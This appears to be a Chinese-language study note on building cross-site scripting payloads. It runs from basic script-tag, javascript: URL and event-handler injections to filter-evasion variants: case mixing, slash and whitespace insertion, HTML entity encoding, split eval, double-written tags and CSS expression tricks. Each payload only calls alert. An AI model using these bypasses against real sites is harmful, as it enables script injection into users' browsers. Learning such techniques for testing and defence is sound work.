#### xss构造

1. 利用<>构造HTML标签和JS<script>标签

    提交`<script>alert(/xss/)</script>`，触发xss攻击

2. 使用JavaScript以为协议方式构造xss

    javascript:alert(/xss/)

    `<a href="javascript:alert(/xss/)">touch me!</a>`

3. 产生的事件

    网页中会发生很多事件，JS可以对这些事件进行响应，可以通过事件触发JS函数，触发XSS

    1. windows事件，对windows对象触发的事件

    2. form事件，HTML表单的动作触发事件

    3. keyboard事件，键盘按键

    4. mouse事件，鼠标或类似用户动作触发的事件

    5. meida事件，由多媒体触发的事件

        鼠标悬停图片触发XSS：<img src='./smile.jpg' onmouseover='alert(/xss/)'>

        点击键盘任意按键触发XSS：`<input type="text" onkeydown="alert(/xss/)">`

        `<input type="text" onkeyup="alert(/xss/)">`

        `<input type="button" onclick="alert(/xss/)">`

    6. 其他标签和手法

        `<svg onload="alert"(/xss/)">`

        `<input onfocus=alert(/xss/) autofucus>`

        

#### XSS的变形

通过构造xss代码进行各种变形，以绕过xss过滤器的检测

1. 大小写转换，将payload进行大小写转化，如：

    `<Img sRc='#' Onerror="alert(/xss/)" />`

    `<a hREf="javaScript:alert(/xss/)">click me</a>`

2. 引号的使用，HTML对引号的使用不敏感，但是某些过滤函数比较严格

    `<img src="#" onerror="alert(/xss/)"/>`

3. /代替空格，可以利用左斜线代替空格

    `<Img/sRc='#'/Onerror='alert(/xss/)' />`

4. 回车，可以在一些位置添加Tab（水平制表符）和回车符，来绕过关键字检测，很难检测到

    `<A hREf="j

    a	v

    a	s

    c	R

    i	p

    t	:

    alert(/xss/)">click me!</a>`

5. 对标签属性值进行转码，用来绕过过滤，对应编码如下：

    | 字母 | ASCII码 | 十进制编码 | 十六进制编码 |
    | ---- | ------- | ---------- | ------------ |
    | a    | 97      | &#97;      | &#x61;       |
    | e    | 101     | &#101;     | &#x65;       |

    编码之后显示：

    `<A hREf="j&#97;v&#x61;script:alert(/xss/)">click me!</a>`

    - 可以将一下任意字符插到任意位置：

      tab	&#9

      换行	&#10

      回车	&#13

    - 也可以将以下字符插入到头部位置：

      SOH	&#01

      STX	&#02

      编码之后的样子

    - 编码之后的样子：

      `<A hREf="&#01;j&#97;v&#x61;s&#9;c&#10;r&#13;ipt:alert(/xss/)">click me!</a>`

6. 拆分跨站

    `<script>z='alert'</script>`

    `<script>z=z+'(/xss/)'</script>`

    `<script>eval(z)</script>`

7. 双写绕过

    `<script>`

    `<scr<script>ipt>`

8. CSS中的变形

    - 使用全角字符

      width:ｅｘｐｒｅｓｓｉｏｎ(alert(/xss/))

    - 注释会被浏览器忽略

      width:expr/*~*/ession(alert(/x~s~s))

    - 样式表中的`[\]`和`[0]`

      `<style>@import	'javasc\ri\0pt:alert("xss")';</style>`

    